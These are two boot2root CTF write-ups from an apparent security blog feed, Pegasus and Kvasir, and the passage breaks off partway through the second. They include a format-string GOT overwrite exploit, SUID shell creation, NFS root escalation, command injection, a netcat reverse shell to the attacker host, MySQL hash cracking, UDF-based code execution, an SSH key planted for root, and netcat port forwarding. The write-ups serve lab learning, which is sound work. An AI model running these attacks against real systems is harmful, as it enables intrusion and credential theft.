<p>(gdb) r &lt;t
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/mike/my_first &lt;t</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: ����</p>

<p>[&hellip; snip &hellip;]</p>

<p>sh: 1: Selection:: not found</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08c3f98c in ?? ()</p>

<h1>check where the GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc
0x8049bfc <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#112;&#114;&#105;&#110;&#116;&#x66;&#x40;&#103;&#x6f;&#116;&#46;&#112;&#x6c;&#116;">&#112;&#114;&#105;&#x6e;&#x74;&#102;&#x40;&#x67;&#x6f;&#x74;&#x2e;&#x70;&#108;&#x74;</a>: 0x40069060</p>

<h1>confirm system() is still there :)</h1>

<p>(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
```</p>

<p>The binary crashes with <code>sh: 1: Selection:: not found</code>, meaning that it is now trying to run <code>system("Selection:")</code> instead of <code>printf("Selection:")</code> due to the GOT override.</p>

<h4>finishing the exploit</h4>

<p>From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get <code>Selection:</code> to actually mean something, like prepare a small SUID C shell perhaps? :)</p>

<p>I quickly compiled some C wrapper code to prepare a shell and ran the exploit.</p>

<p>```bash</p>

<h1>Prep Selection: to make a SUID shell for john</h1>

<h1>and modify PATH</h1>

<p>mike@pegasus:~$ cat tojohn.c</p>

<h1>include &lt;stdio.h></h1>

<p>int main()
{</p>

<pre><code>system("cp /bin/sh /tmp/tojohn");
system("chmod 4777 /tmp/tojohn");
</code></pre>

<p>}
mike@pegasus:~$ gcc tojohn.c -o &ldquo;Selection:&rdquo;
mike@pegasus:~$ export PATH=/home/mike/:$PATH</p>

<h1>run the exploit&hellip;</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: ����</p>

<pre><code>                 10
</code></pre>

<p>Segmentation fault (core dumped)</p>

<h1>&hellip; and check /tmp</h1>

<p>mike@pegasus:~$ ls -lah /tmp/
total 108K
drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
-rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
mike@pegasus:~$
```</p>

<p>We have a new file <code>tojohn</code> in <code>/tmp</code> :D</p>

<p><code>bash
mike@pegasus:~$ /tmp/tojohn
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
</code></p>

<h2>hoofing (rooting) Pegasus</h2>

<p>I added the public key of the keypair I generated for Pegasus to <code>john</code>&rsquo;s authorized_keys file and proceeded to SSH in as him.</p>

<p>Quick enumeration showed that <code>mike</code> is allowed to start the nfs daemon via <code>sudo</code>:</p>

<p>```bash
john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:</p>

<pre><code>env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User john may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /usr/local/sbin/nfs
</code></pre>

<p>john@pegasus:~$ sudo nfs
Usage: nfs [start|stop]
john@pegasus:~$ sudo nfs start
 * Exporting directories for NFS kernel daemon&hellip;                                                                                                                                 [ OK ]
 * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
john@pegasus:~$
```</p>

<p>I checked out the <code>/etc/exports</code> file, and noticed the the <code>no_root_squash</code> flag for the <code>/opt/nfs</code> export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)</p>

<p>So, I mounted the share&hellip;</p>

<p><code>bash
root@kali:~# mkdir nfs
root@kali:~# mount 192.168.56.101:/opt/nfs nfs
</code></p>

<p>&hellip; prepped a SUID shell &hellip;</p>

<p>```bash
root@kali:~/Desktop/pegasus/nfs# cat shell.c</p>

<h1>include &lt;stdio.h></h1>

<p>int main()
{</p>

<pre><code>setuid(0);
setgid(0);
system("/bin/sh");
</code></pre>

<p>}
root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
root@kali:~/Desktop/pegasus/nfs# ls -lah
total 20K
drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
-rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
-rw-r&mdash;r&mdash; 1 root root   79 Dec 23 14:39 shell.c
```</p>

<p>&hellip; and rooted Pegasus :)</p>

<p>```bash
john@pegasus:~$ /opt/nfs/shell</p>

<h1>id</h1>

<p>uid=0(root) gid=0(root) groups=0(root),1000(john)
```</p>

<h2>flag :)</h2>

<p>```text</p>

<h1>cat /root/flag</h1>

<pre><code>           ,
           |`\        
          /'_/_   
        ,'_/\_/\_                       ,   
      ,'_/\'_\_,/_                    ,'| 
    ,'_/\_'_ \_ \_/                _,-'_/
  ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
</code></pre>

<p>   ( (&lsquo; )\/(<em> _ \&rsquo;</em>,\   <em><em>&mdash;&lsquo; </em>,&ndash;</em>/<em>,&ndash;&rsquo;,</em>/ _\      mythology. He is a winged</p>

<pre><code>\_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
 \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
  \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
    &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
  /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
 ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in
  \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
   \_)   &gt;        `\_                           It was a hardware clone of
        /  `,      |`\_                         the Nintendo Famicom.
       /    \     / \ `\
      /   __/|   /  /  `\  
     (`  (   (` (_  \   /   
     /  ,/    |  /  /   \   
    / ,/      | /   \   `\_ 
  _/_/        |/    /__/,_/
 /_(         /_( 
</code></pre>

<p>CONGRATULATIONS! You made it :)</p>

<p>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)</p>

<p>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.</p>

<p>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!</p>

<p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
```</p>

<p>Thanks for the fun <a href="https://twitter.com/theknapsy">@TheKnapsy</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving kvasir - netcat edition]]></title>
    <link href="http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/"/>
    <updated>2014-11-09T10:27:09+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a>, a boot2root by <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!</p>

<p><img class="right <a" src="href="https://i.imgur.com/gHw2Q50.gif">https://i.imgur.com/gHw2Q50.gif</a>"> Kvasir is <em>extremely</em> well polished, and it can be seen throughout the VM that <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.</p>

<p>This writeup details the path I took to read the final flag :)</p>

<!-- more -->


<h2>a usual start</h2>

<p>Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using <code>proxychains</code>, and I was editing <code>/etc/proxychains.conf</code> to match the port of the proxy I needed to use to reach my desired destination.</p>

<p>With that out the way, lets start.<br/>
Almost all of the boot2roots have a discovery phase. After downloading the archive from <a href="http://vulnhub.com">vulnhub.com</a>, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged <em>lazy mode</em>™ and checked what the VirtualBox session showed the IP was:</p>

<p><img class="<a" src="href="https://i.imgur.com/ZTj0D3h.png">https://i.imgur.com/ZTj0D3h.png</a>"></p>

<p><strong>192.168.56.102</strong>. Sweet, throwing <code>nmap</code> at it showed only <code>tcp/80</code> as open.</p>

<p>```bash
root@kali:~# nmap 192.168.56.102</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-11-09 11:07 SAST
Nmap scan report for 192.168.56.102
Host is up (0.000061s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```</p>

<h2>fink ur gud enuf?</h2>

<p>Browsing to the IP using Iceweasel, we see a login portal presented to us:</p>

<p><img class="<a" src="href="https://i.imgur.com/vUSSRt7.png">https://i.imgur.com/vUSSRt7.png</a>"></p>

<p>I made a few attempts at guessing a login, and eventually just threw a <code>'</code> at the username field:</p>

<p><img class="<a" src="href="https://i.imgur.com/gVb0iK7.png">https://i.imgur.com/gVb0iK7.png</a>"></p>

<p>I had a instant troll alert and figured it can&rsquo;t be <em>that</em> easy!? Changing the username payload from <code>'</code> to <code>' OR 1=1 LIMIT 1--</code> with a random word as a password, resulted in the application returning a <code>403</code> type response. I figured that something strange was going on here, and fired up <a href="http://portswigger.net/burp/">Burp Suite</a> to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:</p>

<p><img class="<a" src="href="https://i.imgur.com/mAxhkaG.png">https://i.imgur.com/mAxhkaG.png</a>"></p>

<p>Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered <code>bob:bob</code> with a DoB of <code>09/09/09</code>, and attempted to login with the credentials:</p>

<p><img class="<a" src="href="https://i.imgur.com/o9Utreq.png">https://i.imgur.com/o9Utreq.png</a>"></p>

<p>Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as <code>'a', 'a', 0, NULL)</code>. Considering this was a new account registration page, my guess was that this was part of a <code>INSERT</code> query:</p>

<p><img class="<a" src="href="https://i.imgur.com/DA1Xe5H.png">https://i.imgur.com/DA1Xe5H.png</a>"></p>

<p>It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &lsquo;ol <code>wfuzz</code> on the web service to see if there was anything interesting to reveal:</p>

<p>```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  &mdash;hc 404 <a href="http://192.168.56.102/FUZZ.php">http://192.168.56.102/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.102/FUZZ.php">http://192.168.56.102/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>00077:  C=302     16 L        34 W      365 Ch    &ldquo; &ndash; admin&rdquo;
00302:  C=403     10 L        30 W      294 Ch    &ldquo; &ndash; cgi-bin/&rdquo;
00394:  C=403     10 L        30 W      292 Ch    &ldquo; &ndash; create&rdquo;
00455:  C=403     10 L        30 W      294 Ch    &ldquo; &ndash; descarga&rdquo;
00457:  C=403     10 L        30 W      296 Ch    &ldquo; &ndash; descarrega&rdquo;
00463:  C=403     10 L        30 W      298 Ch    &ldquo; &ndash; descarregues&rdquo;
00741:  C=200     20 L        44 W      464 Ch    &ldquo; &ndash; index&rdquo;
00894:  C=403     10 L        30 W      290 Ch    &ldquo; &ndash; load&rdquo;
00901:  C=302      0 L         0 W        0 Ch    &ldquo; &ndash; login&rdquo;
00904:  C=302      0 L         0 W        0 Ch    &ldquo; &ndash; logout&rdquo;
00964:  C=302     15 L        16 W      168 Ch    &ldquo; &ndash; member&rdquo;
01247:  C=200     17 L        39 W      426 Ch    &ldquo; &ndash; register&rdquo;
01331:  C=403     10 L        30 W      292 Ch    &ldquo; &ndash; select&rdquo;
01432:  C=200      0 L         0 W        0 Ch    &ldquo; &ndash; submit&rdquo;
01556:  C=403     10 L        30 W      292 Ch    &ldquo; &ndash; update&rdquo;
01565:  C=403     10 L        30 W      293 Ch    &ldquo; &ndash; updates&rdquo;
```</p>

<p>Woa, thats quite a bit of results to work through eh :)</p>

<h2>admins only want to 302 here</h2>

<p>Of everything <code>wfuzz</code> revealed to us, <code>admin.php</code> was the most interesting one. Watching Burp as the requests went up and down, I noticed that <code>admin.php</code> would return a HTTP 302 code with a location, along with an actual body:</p>

<p><img class="<a" src="href="https://i.imgur.com/exdmq5A.png">https://i.imgur.com/exdmq5A.png</a>"></p>

<p>Sweet! I modified the response in Burp to return <code>200</code> instead, and removed the <code>Location:</code> header. We now had a new page to work with :)</p>

<p><img class="<a" src="href="https://i.imgur.com/6WoT1x2.png">https://i.imgur.com/6WoT1x2.png</a>"></p>

<p>The form hints that we can check the service status of daemons running on the underlying OS, and suggests <code>apache2</code> as input. I submitted the form with <code>apache2</code> as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section <code>Apache2 is running (pid 1330).</code>. This just <strong>screams</strong> command injection doesn’t it?</p>

<h2>command injection</h2>

<p>In order for me to fuzz this further, I took the request to trusty &lsquo;ol <code>curl</code>. While doing this, I realized that <code>admin.php</code> did no checks to ensure that we are authenticated or anything. We could simply submit <code>service=&lt;payload&gt;</code> as a POST to <code>admin.php</code> and get output:</p>

<p>```bash
root@kali:~# curl &lsquo;<a href="http://192.168.56.102/admin.php">http://192.168.56.102/admin.php</a>&rsquo; &mdash;data &lsquo;service=apache2;&rsquo;</p>

<p><html>
<body></p>

<p><div align="center"></p>

<p><h1>Service Check</h1></p>

<p><form name="service" method="post" action="">
<input name="service" id="service" type="text" placeholder="apache2" /><br /><br />
<input name="submit" id="submit" type="submit" value="Submit" />
</form></p>

<p><form action="logout.php" method="post">
<input type="submit" value="Logout" />
</form></p>

<p><pre>Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
</pre>
```</p>

<p>Entering <code>apache2;</code> as the input, revealed the first step in our command injection. With <code>apache2;</code> as the payload, I figured that the php script was taking our user input and running with the following pseudo code:</p>

<p>```php
&lt;?php</p>

<p>print system(&ldquo;/etc/init.d/&rdquo; . $_POST[&ldquo;service&rdquo;] . &ldquo; status&rdquo;);
```</p>

<p>So, with our payload, we have modified this to run <code>/etc/init.d/apache2; status</code>, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting <code>service=</code> as <code>;echo 'id';</code> where the single quotes are actually back ticks. (octopress grrr)</p>

<p><code>``bash
root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=;echo</code>id`;'</p>

<p>[&hellip; snip &hellip;]</p>

<p><pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```</p>

<h2>netcat is our entry into the rabbit hole</h2>

<p>With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&rsquo;d out. This ended up as the following python script:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir Command Execution</h1>

<h1>$ python cmd.py &ldquo;uname -a&rdquo;</h1>

<h1>Command to run: uname -a</h1>

<h1></h1>

<h1>Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux</h1>

<p>import requests
import re
import sys
import os
import binascii</p>

<p>print &lsquo;Command to run: %s&rsquo; % sys.argv[1]</p>

<h1>generate 2 random strings so that we can regex out the command output</h1>

<p>command_start = binascii.b2a_hex(os.urandom(30))
command_end = binascii.b2a_hex(os.urandom(30))</p>

<h1>prepare something that we can regex out</h1>

<p>params = {&lsquo;service&rsquo; : &lsquo;;echo %s; echo <code>%s</code>; echo %s;&rsquo; % (command_start, sys.argv[1], command_end) }</p>

<h1>fetch, ignoring the troll redirect</h1>

<p>r = requests.post(&lsquo;<a href="http://192.168.56.102/admin.php">http://192.168.56.102/admin.php</a>&rsquo;, params, allow_redirects=False)</p>

<h1>match regex and print</h1>

<p>print  re.findall(r'%s([^|]+)%s' % (command_start, command_end), r.text)[0].replace(&lsquo;\n%s\n&rsquo; % command_end,&lsquo;&rsquo;)
```</p>

<p>So, now I can just run <code>python cmd.py "id"</code> and get the output (the <em>(kvasir)</em> in front of my prompt is my python virtualenv where I installed the <code>requests</code> dependency):</p>

<p>```bash
(kvasir)root@kali:~# python cmd.py &ldquo;id&rdquo;
Command to run: id</p>

<p>uid=33(www-data) gid=33(www-data) groups=33(www-data)
```</p>

<p>And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. <strong>192.168.1.100</strong> and <strong>192.168.2.100</strong>. No sign of <strong>192.168.56.102</strong> here&hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with <code>nc -lvp 4444</code>, and connected to it using my <code>cmd.py</code> script <code>python cmd.py "/bin/nc 192.168.56.101 4444 -e /bin/bash"</code>:</p>

<p><code>bash
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></p>

<p>So, in order to make sure we don&rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host <code>web</code>:</p>

<p><img class="<a" src="href="https://i.imgur.com/Q2rSi2G.png">https://i.imgur.com/Q2rSi2G.png</a>"></p>

<p>The only public presence of the internal network is therefore the originally discovered <strong>192.168.56.102</strong> IP address.</p>

<h2>my-see-qual as root deserves a slap on the wrist</h2>

<p>With semi interactive shell access using <code>netcat</code> to <strong>web</strong> (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from <code>member.php</code>:</p>

<p>```php
&lt;?php</p>

<p>session_start();</p>

<p>if (!isset($_SESSION[&ldquo;member&rdquo;])) {</p>

<pre><code>header("Location: index.php");
</code></pre>

<p>}</p>

<p>$user = $_SESSION[&ldquo;username&rdquo;];</p>

<p>mysql_connect(&ldquo;192.168.2.200&rdquo;, &ldquo;webapp&rdquo;, &ldquo;webapp&rdquo;) or die(mysql_error());
mysql_select_db(&ldquo;webapp&rdquo;) or die(mysql_error());</p>

<p>$query = &ldquo;SELECT dob FROM users WHERE username=&lsquo;$user&rsquo;&rdquo;;
$result = mysql_query($query) or die(mysql_error());</p>

<p>?>
[&hellip; snip &hellip;]
```</p>

<p>So mysql access with <code>webapp:webapp</code> at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'show grants;'
Grants for webapp@192.168.2.100
GRANT SELECT, INSERT ON *.* TO 'webapp'@'192.168.2.100' IDENTIFIED BY PASSWORD '*BF7C27E734F86F28A9386E9759D238AFB863BDE3'
GRANT ALL PRIVILEGES ON `webapp`.* TO 'webapp'@'192.168.2.100'
</code></p>

<p>So I can select anywhere. Nice :)</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; show tables;'
Tables_in_webapp
todo
users
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; select * from todo;'
task
stop running mysql as root
</code></p>

<p>A table called <code>todo</code> exists, with a string <code>stop running mysql as root</code>. That was the first hint and immediately had me thinking about <a href="http://www.mysqludf.org/">MySQL UDF</a>&rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:</p>

<p><code>bash
mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use mysql; select DISTINCT User,Password from user;'
User    Password
root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
</code></p>

<p>As a side note, further enumeration of the PHP sources and MySQL table <code>users</code> showed that if we injected SQL on the registration page to add a extra <code>1</code>, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.</p>

<h3>cracking root&rsquo;s MySQL password</h3>

<p>Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used <code>hashcat</code> with the ever famous <code>rockyou</code> wordlist:</p>

<p>```bash</p>

<h1>first, echo the hash to a file</h1>

<p>root@kali:~# echo &ldquo;ECB01D78C2FBEE997EDA584C647183FD99C115FD&rdquo; > db.root</p>

<h1>next, we tell hash cat the type of hash we have and wait a few seconds :)</h1>

<p>root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.</p>

<p>Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size&hellip;</p>

<p>Added hashes from file db.root: 1 (1 salts)
Activating quick-digest mode for single-hash</p>

<p>NOTE: press enter for status-screen</p>

<p>ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater</p>

<p>All hashes have been recovered</p>

<p>Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index&hellip;..: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: &ndash; plains, 3.27M words
Progress..: 281260/3627099 (7.75%)
Running&hellip;: &mdash;:&mdash;:&mdash;:&mdash;
Estimated.: 00:00:00:01</p>

<p>Started: Sun Nov  9 14:07:14 2014
Stopped: Sun Nov  9 14:07:14 2014
```</p>

<p>The password for the MySQL <code>root</code> user is therefore <code>coolwater</code>:</p>

<p><code>bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'show grants;'
Grants for root@192.168.2.100
GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.2.100' IDENTIFIED BY PASSWORD '*ECB01D78C2FBEE997EDA584C647183FD99C115FD' WITH GRANT OPTION
</code></p>

<h3>loading the UDF remotely</h3>

<p>With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.</p>

<p>I grabbed a copy of a <code>do_system()</code> UDF that I have previously used successfully from <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">here</a>, called <code>raptor_udf.c</code>. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the <code>web</code> host. Compilation was done on the <code>web</code> host with:</p>

<p><code>bash
gcc -g -c raptor_udf.c -fPIC
gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
</code></p>

<p>This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word <code>uploading</code> sounds trivial, however its not. I need to know <em>where</em> to first. For this, I enumerate the MySQL <code>plugin_dir</code>:</p>

<p><code>bash
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@plugin_dir;'
@@plugin_dir
/usr/lib/mysql/plugin/
</code></p>

<p>So this means I need to write the udf to <code>/usr/lib/mysql/plugin/raptor_udf.so</code>. Fair enough. But how do I write this? Well there are many approaches to this. One is to use <code>--local-infile=1</code> as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the <strong>local</strong> file to wherever (a table in our case) and then to a file via <code>INTO DUMPFILE</code>. The other option is to simply convert the content to hex, and run <code>SELECT 0x</code> + <code>&lt;CONTENT AS HEX&gt;</code> + <code>INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so</code>.</p>

<p>I opted for the content encoding as hex and generated a <code>xxd</code> output of the compiled <code>raptor_udf.so</code>. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of <code>Undefined Symbol "do_system" in raptor_udf.so</code>. :\</p>

<p>Eventually, I opted to find a precompiled 64bit <code>.so</code> to upload, and found one in the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so">sqlmap repository</a>. I downloaded this and converted it to hex using <code>xxd</code>. I then created the following file with the mysql commands to run on the <code>web</code> host from my attacking machine:</p>

<p>```bash
root@kali:~# cat load_udf.sh
touch log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;use mysql; select 0x7f454</p>

<pre><code>[... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]
</code></pre>

<p>0000000000000 into dumpfile &ldquo;/usr/lib/mysql/plugin/raptor_udf.so&rdquo;;&lsquo; 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e 'create function sys_exec returns integer soname &ldquo;raptor_udf.so&rdquo;;&rsquo; 2>> log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;use mysql; select * from mysql.func;&rsquo; 2>> log</p>

<h1>this adds me a SSH key to roots authorized keys using the command execution udf we have prepared</h1>

<p>mysql -uroot -pcoolwater -h 192.168.2.200 -e &lsquo;select sys_exec(&ldquo;echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&rdquo; > /root/.ssh/authorized_keys")&rsquo; 2>> log
```</p>

<p>With this file ready, I opened a netcat port to pipe it to, and read it on <code>web</code>:</p>

<p>```bash</p>

<h1>on the attacking machine, I opened netcat with my mysql commands</h1>

<p>root@kali:~# nc -lvp 4444 &lt; load_udf.sh
listening on [any] 4444 &hellip;</p>

<h1>then on the original netcat shell I have, read it</h1>

<p>timeout 3 nc 192.168.56.101 4444 | sh
name    ret dl  type
sys_exec    2   raptor_udf.so   function
sys_exec(&ldquo;echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
0
```</p>

<p>The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of <code>0</code>, indicating that it was successful. I specify the <code>timeout</code> command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)</p>

<h2>ssh to db host</h2>

<p>With all that done, I have my public key for the <code>root</code> user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I <em>get</em> to 192.168.2.200&rsquo;s port 22? :)</p>

<p>For that, I decided to look at <code>netcat</code> port forwarding! But first, lets read some man pages:</p>

<p>```bash</p>

<h1>from nc(1)</h1>

<p>OPTIONS</p>

<pre><code>   -c string    specify shell commands to exec after connect (use with caution).
</code></pre>

<p>```</p>

<p><em>&ldquo;use with caution&rdquo;</em>. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!</p>

<p><img class="<a" src="href="https://i.imgur.com/7IggbMC.jpg">https://i.imgur.com/7IggbMC.jpg</a>"></p>

<p>Lets see this in action. First I setup the initial listener on the attacking machine:</p>

<p>```bash</p>

<h1>listen on tcp/4444, re-listening on tcp/222 on a new connection</h1>

<p>root@kali:~# nc -lvp 4444 -c &ldquo;nc -lvp 222&rdquo;
listening on [any] 4444 &hellip;
```</p>

<p>With the listener setup, lets issue a new <code>nc</code> command in the initial shell that I got on <code>web</code>, connecting the dots:</p>

<p><code>bash
nc 192.168.56.101 4444 -c "nc 192.168.2.200 22"
</code></p>

<p>When this runs, the initial listener will see the new connection, and I should have the <code>tcp/22</code> of <strong>192.168.2.200</strong> now forwarded locally:</p>

<p>```bash
root@kali:~# nc -lvp 4444 -c &ldquo;nc -lvp 222&rdquo;
listening on [any] 4444 &hellip;</p>

<h1>connection comes in from 192.168.1.100</h1>

<p>192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
